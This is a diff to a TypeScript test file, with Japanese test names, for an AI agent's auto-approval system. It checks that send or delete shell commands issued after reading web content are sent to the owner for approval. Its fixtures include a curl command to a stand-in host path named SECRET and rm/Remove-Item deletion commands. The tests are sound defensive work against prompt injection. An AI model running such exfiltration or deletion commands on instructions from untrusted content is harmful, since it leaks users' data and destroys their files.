@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict';
-import { mkdirSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { test } from 'node:test';
 import type { RunEvent, StopReason, ToolCall } from '../src/engine/types.ts';
@@ -499,11 +499,15 @@ test('自動承認（タスク）: 判定役が答えられない（モデルを
 
 test('自動承認（タスク）: Web を読んだあとの送る操作・消す操作は、判定役に回さず持ち主に聞く', async t => {
   const fetchGet = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
-  for (const [label, next, reason] of [
+  for (const [label, step, reason] of [
     ['送る', toolCall('shell_run', { command: fetchGet }), /This sends something out/u],
-    ['消す', toolCall('memory_forget', { id: 1, reason: 'x' }), null],
+    ['消す（記憶）', toolCall('memory_forget', { id: 1, reason: 'x' }), null],
+    ['消す（シェル）', null, /Remove-Item|"rm"/u],
   ] as const) {
     const s = await webApp(t);
+    const target = join(s.paths.workspace, 'old.txt');
+    writeFileSync(target, '古いメモ');
+    const next = step ?? toolCall('shell_run', { command: process.platform === 'win32' ? `Remove-Item "${target}"` : `rm "${target}"` });
     const started = await runTaskWith(s, [toolCall('web_fetch', { url: 'https://news.example.com/' }), next, say(ALLOW), say('おわり')]);
     await waitFor(() => s.app.approvals.pending().length === 1, `${label}の札`);
     const [card] = s.app.approvals.pending();
@@ -512,6 +516,7 @@ test('自動承認（タスク）: Web を読んだあとの送る操作・消�
     s.app.approvals.decide(card!.id, 'deny');
     await started.done;
     assert.equal(s.app.db.prepare("SELECT COUNT(*) AS n FROM approvals WHERE scope = 'auto'").get()!.n, 0, label);
+    assert.ok(existsSync(target), `${label}: ファイルは残る`);
   }
 });
 
@@ -568,19 +573,47 @@ test('自動承認（タスク）: Clive が自分で決めたタスク・好奇
     const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => make(s));
     const seen = await ownerDecides(s, started, label);
     assert.equal(seen.classified, 0, `${label}: 判定役を呼ばない`);
-    assert.match(seen.reasons, /could not give an answer/u, label);
+    assert.match(seen.reasons, /task's text was not written by you/u, label);
+    assert.doesNotMatch(seen.reasons, /could not give an answer/u, label);
+  }
+});
+
+test('自動承認（タスク）: Clive が自分で決めたタスク・好奇心のタスクの実行が作るタスクは、requested_by_user でも Clive が決めたもの（self）になる', async t => {
+  for (const origin of ['self', 'curiosity', 'user'] as const) {
+    const s = await webApp(t);
+    const started = await runTaskWith(s, [toolCall('task_create', { title: `作る-${origin}`, requested_by_user: true }), say('おわり')], () => s.app.tasks.create({ title: '元のタスク', origin, actor: 'clive' }));
+    await started.done;
+    const made = s.app.db.prepare('SELECT origin FROM tasks WHERE title = ?').get(`作る-${origin}`) as { origin: string } | undefined;
+    assert.equal(made?.origin, origin === 'user' ? 'user' : 'self', origin);
+  }
+});
+
+test('自動承認（タスク）: 繰り返しの予定を消しても、Clive が決めた予定から作った実行のタスクは、Clive が決めたもの（判定役に見せる依頼は空）のまま', async t => {
+  const s = await webApp(t);
+  for (const origin of ['self', 'user'] as const) {
+    const template = s.app.tasks.create({ title: `予定-${origin}`, origin, actor: 'clive', cron: '0 9 * * *' });
+    const instance = s.app.tasks.spawnNow(template.id)!;
+    s.app.tasks.finish(instance.id, 'done', null, 'user');
+    s.app.tasks.remove(template.id);
+    const after = s.app.tasks.get(instance.id)!;
+    assert.equal(after.parent_id, null, origin);
+    assert.equal(after.origin, origin === 'self' ? 'self' : 'schedule', origin);
+    assert.equal(s.app.tasks.judgeRequest(instance.id), origin === 'self' ? '' : `予定-${origin}`, origin);
   }
 });
 
 test('自動承認（タスク）: よそから来た文を読んだ実行（その会話）が作った・書き足したタスクは、依頼が持ち主の文と言えないので持ち主に聞く。読んでいない実行なら判定役が決める', async t => {
-  for (const [label, tainted, kind] of [['作った（読んだ実行）', true, 'context'], ['書き足した（読んだ実行）', true, 'note'], ['作った（読んでいない実行）', false, 'context']] as const) {
+  for (const [label, tainted, kind] of [
+    ['作った（読んだ実行）', true, 'context'], ['書き足した（読んだ実行）', true, 'note'], ['書き換えた（読んだ実行）', true, 'edited'],
+    ['記録の無い実行', 'missing', 'note'], ['作った（読んでいない実行）', false, 'context'], ['書き換えた（読んでいない実行）', false, 'edited'],
+  ] as const) {
     const s = await webApp(t);
     const command = workspaceRead(s);
     const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => {
       const chat = s.app.conversations.create({ title: '作った会話' });
       const runId = `run-${label}`;
-      s.app.runs.start(runId, 'chat', chat.id);
-      if (tainted) s.app.runs.markTainted(runId);
+      if (tainted !== 'missing') s.app.runs.start(runId, 'chat', chat.id);
+      if (tainted === true) s.app.runs.markTainted(runId);
       const task = s.app.tasks.create({ title: '作られたタスク', origin: 'user', actor: 'clive' });
       s.app.tasks.event(task.id, kind, 'clive', 'x', runId);
       return task;
